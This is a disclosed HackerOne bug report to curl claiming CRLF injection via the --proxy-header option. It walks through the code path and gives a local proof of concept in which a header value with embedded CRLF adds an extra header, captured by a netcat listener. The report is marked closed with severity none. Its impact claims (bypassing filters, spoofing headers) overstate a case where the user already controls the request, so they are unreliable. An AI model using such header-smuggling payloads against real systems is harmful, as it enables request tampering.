# CRLF Injection in `--proxy-header` allows extra HTTP headers (CWE-93)

## Report Details
- **Report ID**: 3133379
- **URL**: https://hackerone.com/reports/3133379
- **State**: Closed
- **Severity**: none
- **Submitted**: 2025-05-07T22:24:22.322Z
- **Disclosed**: 2025-05-08T08:21:52.339Z

## Reporter
- **Username**: oblivionsage
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: curl

## Vulnerability Information
Hello Team,

There is a bug in `curl` where a user can inject **new HTTP headers** into a proxy request by using special characters in the `--proxy-header` option.

This is done by adding `\r\n` (carriage return + line feed) inside the header value. This breaks the HTTP format and lets the user create more headers from a single line



#  What’s the Problem?

The problem happens because `curl` **does not check** for `\r` or `\n` in the input. So if a user puts:

```bash
--proxy-header $'X-Test: hello\r\nX-Evil: owned'
```

The proxy sees **two headers**:

```
X-Test: hello
X-Evil: owned
```

This is **not supposed to happen**



#  How the Code Works (with file paths and lines)

Here’s how `curl` processes the `--proxy-header` input:



## Main Function

`src/tool_main.c` line 238

Entry point of the program:

```c
int main(int argc, char *argv[])
```

## Calling `operate()`

`src/tool_main.c` line 284

```
result = operate(&global, argc, argv);
```
##CLI Parsing

`src/tool_operate.c`, line 3186

```
parse_args(global, argc, argv);
```

##Handling `--proxy-header`

`src/tool_getparam.c` line 2766

```c
case C_PROXY_HEADER:
    err = parse_header(global, config, cmd, nextarg);
```


##Passing the value

`src/tool_getparam.c`, line 1281

```
err = add2list(&config->proxyheaders, nextarg);
```

##No Filtering Happens


`src/tool_paramhlp.c`, line 614–615

```
ParameterError add2list(...) {
    struct curl_slist *newlist = curl_slist_append(*list, ptr);
```

At this point, the raw input (even if it includes \r\n) is passed as-is to `curl_slist_append()`, and then into the final HTTP request

There is no check to block newline injection



#  Proof of Concept

# 1. Start a fake proxy listener:

```bash
nc -lvp 8080
```

# 2. Run curl with a payload header:

```bash
curl --proxy http://127.0.0.1:8080 \
     --proxy-header $'X-Evil: val\r\nInjected-Header: pwned' \
     http://example.com
```

Attachment:

{F4325956}

# 3. Netcat output:

```
Listening on 0.0.0.0 8080
Connection received on localhost 54198
GET http://example.com/ HTTP/1.1
Host: example.com
User-Agent: curl/8.13.0
Accept: */*
Proxy-Connection: Keep-Alive
X-Evil: val
Injected-Header: pwned

```

It proves that one CLI input caused **two** headers

Attachment:

{F4325954}







##  Suggested Fix

In this file:

`src/tool_paramhlp.c`, inside `add2list()`, around line **615**:

Add a simple check:

```c
if(strchr(ptr, '\r') || strchr(ptr, '\n'))
    return PARAM_INVALID_HEADER;
```

This will block all `\r` or `\n` inside header input.

## Impact

This bug allows the user to inject raw HTTP headers into proxy requests.

By using a single command-line input, a user can add multiple headers.This breaks the normal HTTP format and can be used to:

Bypass security filters (WAF, proxy rules)

Inject spoofed headers like X-Forwarded-For, Authorization

Poison logs on the proxy

 Bug is easy to test

The issue is real and  affects live network traffic

 Similar bugs in other tools got CVEs


Tested on `curl 8.13.0` (May 2025), on Kali Linux


Thanks for reviewing. Let me know if you need help verifying the fix

## Attachments
- image.png
- image.png
